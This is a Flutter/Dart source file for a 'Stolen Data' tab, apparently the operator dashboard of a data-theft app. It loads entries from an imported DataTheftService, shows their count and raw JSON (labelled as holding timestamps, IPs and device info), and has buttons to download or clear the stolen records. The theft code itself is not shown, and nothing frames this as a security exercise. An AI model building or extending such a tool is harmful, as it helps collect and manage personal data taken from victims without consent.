// stolen_data_tab.dart
import 'package:flutter/material.dart';
import '../services/data_theft_service.dart';

class StolenDataTab extends StatefulWidget {
  final DataTheftService dataTheftService;

  StolenDataTab({required this.dataTheftService});

  @override
  _StolenDataTabState createState() => _StolenDataTabState();
}

class _StolenDataTabState extends State<StolenDataTab> {
  String _stolenData = "Loading stolen data...";
  int _entryCount = 0;

  @override
  void initState() {
    super.initState();
    _loadStolenData();
  }

  Future<void> _loadStolenData() async {
    final data = await widget.dataTheftService.readStolenData();
    final entries = widget.dataTheftService.getAllStolenData();
    
    setState(() {
      _stolenData = data;
      _entryCount = entries.length;
    });
  }

  Future<void> _downloadJson() async {
    await widget.dataTheftService.downloadJsonFile();
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("JSON file downloaded with $_entryCount entries"),
        backgroundColor: Colors.green,
      ),
    );
  }

  Future<void> _clearData() async {
    widget.dataTheftService.clearStolenData();
    await _loadStolenData();
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("All stolen data cleared"),
        backgroundColor: Colors.orange,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16.0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                "Stolen Data Collection",
                style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
              ),
              Text(
                "Entries: $_entryCount",
                style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold),
              ),
            ],
          ),
          SizedBox(height: 10),
          Text(
            "All stolen data is collected in JSON format with timestamps, IPs, and device info:",
            style: TextStyle(color: Colors.grey),
          ),
          SizedBox(height: 20),
          Row(
            children: [
              ElevatedButton(
                onPressed: _downloadJson,
                child: Text("Download JSON"),
                style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
              ),
              SizedBox(width: 10),
              ElevatedButton(
                onPressed: _clearData,
                child: Text("Clear Data"),
                style: ElevatedButton.styleFrom(backgroundColor: Colors.orange),
              ),
              SizedBox(width: 10),
              ElevatedButton(
                onPressed: _loadStolenData,
                child: Text("Refresh"),
              ),
            ],
          ),
          SizedBox(height: 20),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(8),
              ),
              child: SingleChildScrollView(
                child: Text(
                  _stolenData,
                  style: TextStyle(
                    color: Colors.green,
                    fontFamily: 'Monospace',
                    fontSize: 12,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}